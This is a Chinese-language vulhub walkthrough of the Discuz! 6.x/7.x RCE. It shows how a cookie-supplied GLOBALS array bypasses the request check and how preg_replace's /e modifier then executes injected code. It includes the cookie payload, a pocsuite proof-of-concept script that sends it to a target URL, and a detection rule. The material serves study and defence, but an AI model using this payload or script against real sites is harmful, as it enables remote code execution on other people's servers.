# Discuz! 6.x/7.x 全局变量防御绕过-命令执行  

**本文章适合正在利用vulhub进行漏洞复现的朋友，或者准备学习漏洞复现的朋友，大佬就可以绕过了，写的比较基础。我也是一个小白，总结一下对于vulhub的使用技巧和一些漏洞原理，也分享一些自己觉得好用的方法给大家，欢迎大家帮我补充，有什么好用的技巧也可以分享一下，大家共同进步。本篇有自己的理解，如果有什么不对的或者不好的地方希望大家不要喷我，但是欢迎帮我指正。最后希望大家可以关注我的专栏。**

 **(疫情期间大家注意勤洗手，出门一定要戴口罩！不去人多的地方。)**

## 1.漏洞描述：

在php5.3.x配置中，request_order默认为GP，导致攻击者可以绕过全局变量防御，最终执行任意代码。

什么是GP？就是虚拟游戏中的情侣，不太对那个应该叫CP。。。

GP也就是说默认配置下$_REQUEST只包含$_GET和$_POST而不包括$_COOKIE。  

## 2.漏洞原理：

include/global.func.php代码里：  

,在GPC为off时这段代码会调用addslashes()函数处理变量值,如果我们直接使用/$_COOKIE、$_GET、$_POS这样的变量,addslashes()函数就不起作用了。  

    
    
    function daddslashes($string, $force = 0) {
        !defined('MAGIC_QUOTES_GPC') && define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc());
        if(!MAGIC_QUOTES_GPC || $force) {
            if(is_array($string)) {
                foreach($string as $key => $val) {
                    $string[$key] = daddslashes($val, $force);
                }
            } else {
                $string = addslashes($string);
            }
        }
        return $string;
    }

include/common.inc.php里：

直接使用$_GET/$_POST/$_COOKIE的地方很少  

    
    
    foreach(array('_COOKIE', '_POST', '_GET') as $_request) {
        foreach($$_request as $_key => $_value) {
            $_key{0} != '_' && $$_key = daddslashes($_value);
        }
    }

以下代码对全局变量进行了防御，如果检测到全局变量就会退出

    
    
    #include/common.inc.php
    if (isset($_REQUEST['GLOBALS']) OR isset($_FILES['GLOBALS'])) {
        exit('Request tainting attempted.');  
    

但此处使用REQUEST来进行判断，在php5.3.x中request_order默认值为GP，意思只从GET、POST中获取GLOBALS，所以我们可以通过COOKIE提交GLOBALS变量绕过了该层防御。

下面是最终执行利用的代码

    
    
    #include/discuzcode.func.php
    function discuzcode(... $smileyoff, $bbcodeoff, $htmlon = 0, $allowsmilies = 1, ...)
      ...
      if(!$smileyoff && $allowsmilies && !empty($GLOBALS['_DCACHE']['smilies']) && is_array($GLOBALS['_DCACHE']['smilies'])) {
        $message = preg_replace($GLOBALS['_DCACHE']['smilies']['searcharray'], $GLOBALS['_DCACHE']['smilies']['replacearray'], $message, $maxsmilies);
        }  
    

上述代码通过preg_replace函数达到命令执行的目的(这里也需要php版本的支持，不过5.3.x是支持该函数

## 3.vulhub漏洞利用：

用vulhub复现漏洞可以省去环境的搭建过程，相当方便。

vulhub官网地址：[https://vulhub.org](https://vulhub.org/)

  

![image.png](https://image.3001.net/images/20191226/1577348791_5e046eb7304dc.png!small)

启动漏洞环境。

    
    
    docker-compsoe up -d
    

  

按照步骤安装discuz

![image.png](https://image.3001.net/images/20200302/1583130901_5e5ca915c801f.png!small)

配置完成后登录进来就可以进行漏洞环境的利用了。

我们这里随便找一篇帖子，网上文章说需要一个带表情评论的帖子，实际测试发现并不需要。

![image.png](https://image.3001.net/images/20200302/1583130953_5e5ca949e33a2.png!small)  

利用burp进行抓包，然后在cookie中加入我们的payload  

利用语句  
---  
GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui;
GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();  
  
  
这里有必要给大家拓展一些知识点，这个payload为什么 这么写？为什么payload写成这样可以执行？

    
    
     $message = preg_replace($GLOBALS['_DCACHE']['smilies']['searcharray'], $GLOBALS['_DCACHE']['smilies']['replacearray'], $message, $maxsmilies);  
    

看到了preg_replace()函数，这个函数是干嘛的呢？  

mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [,
int $limit = -1 [, int &$count ]] )  

搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。

参数说明：

$pattern: 要搜索的模式，可以是字符串或一个字符串数组。 $replacement: 用于替换的字符串或字符串数组。 $subject:
要搜索替换的目标字符串或字符串数组。 $limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。
$count: 可选，为替换执行的次数。

返回值

如果 subject 是一个数组， preg_replace() 返回一个数组， 其他情况下返回一个字符串。

如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。

看一个例子：  

    
    
    <?php 
    $string = 'xssle 123, 456'; 
    $pattern = '/(\w+) (\d+), (\d+)/i'; 
    $replacement = 'lexss ${2},$3'; 
    echo preg_replace($pattern, $replacement, $string); 
    ?>  
    

结果为：lexss 123，456  

既然只是正则替换为什么可以执行命令呢？  

$pattern 存在 模式修正符，允许代码执行 /e， /e为 模式修正符，是 preg_replace()将
$replacement当做php代码来执行  

对于该漏洞中实际的执行代码是这样的  

    
    
    $message = preg_replace(/.*/eui, phpinfo(),$maxsmilies);  
    

这里会将匹配到的内内容用phpinfo()进行替换，/e修正符会将phpinfo()当做代码来执行。最终造成该漏洞的产生。

“遗憾”的是该修正符模式在PHP 5.5.0起就开始废弃了，但很多网站依然在使用老版本的PHP。

下面就是利用成功后的图片。

##
![image.png](https://image.3001.net/images/20200302/1583131358_5e5caadeb570f.png!small)4.漏洞验证脚本：  

    
    
    class DiscuzPoc(POCBase):         
        vulID = '00000'  # ssvid
        version = '1.0'
        author = ['xssle']
        vulDate = '2020-03-02'
        createDate = '2020-03-02'
        updateDate = '2020-03-02'
        references = ['https://www.secpulse.com/archives/2338.html']
        name = 'Discuz! 6.x/7.x 全局变量防御绕过导致命令执行'
        appPowerLink = 'www.discuz.cn'
        appName = 'Discuz'
        appVersion = '6.x,7.x'
        vulType = 'Romote Code Execution'
        desc = '''
            php5.3.x中由于request_order为GP，使用COOKIE即可绕过全局变量防御，最后pre_replace触发了命令执行
        '''
        pocDesc = '''
            pocsuite -r ***.py -u target --verify --extra-params="{'tid':'指定帖子id'}"
        '''
        samples = []
        install_requires = ['']
     
        def _verify(self):
            result = {}
            tid = 13    # 默认帖子id
            if tid in self.params:
                tid = self.params['tid']
            path = "viewthread.php?tid={}".format(tid)
            url = self.url + '/' + path
             
            cookies = {
                "GLOBALS[_DCACHE][smilies][searcharray]" : "/.*/eui",
                "GLOBALS[_DCACHE][smilies][replacearray]" : "phpinfo()"
            }
            try:
                resp = req.get(url, cookies=cookies)
                if resp and resp.status_code == 200 and "<title>phpinfo()</title>" in resp.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = url
                    result['VerifyInfo']['Cookie'] = cookies
            except Exception as ex:
                pass
     
            return self.parse_output(result)
     
        def parse_output(self, result):
            output = Output(self)
            if result:
                output.success(result)
            else:
                output.fail('target is not vulnerable')
            return output
     
        def _attack(self):
            return self._verify()
     
     
    register(DiscuzPoc)  
    

、![image.png](https://image.3001.net/images/20200302/1583131716_5e5cac443e5d9.png!small)

  

##  **5.检测规则**

规则名称：Discuz! 6.x/7.x RCE

规则类型：RCE

规则内容  
  
---  
request.cookie: GLOBALS[_DCACHE][smilies][searcharray]=  
  
  
  

  

  

  

  

  

##  

  

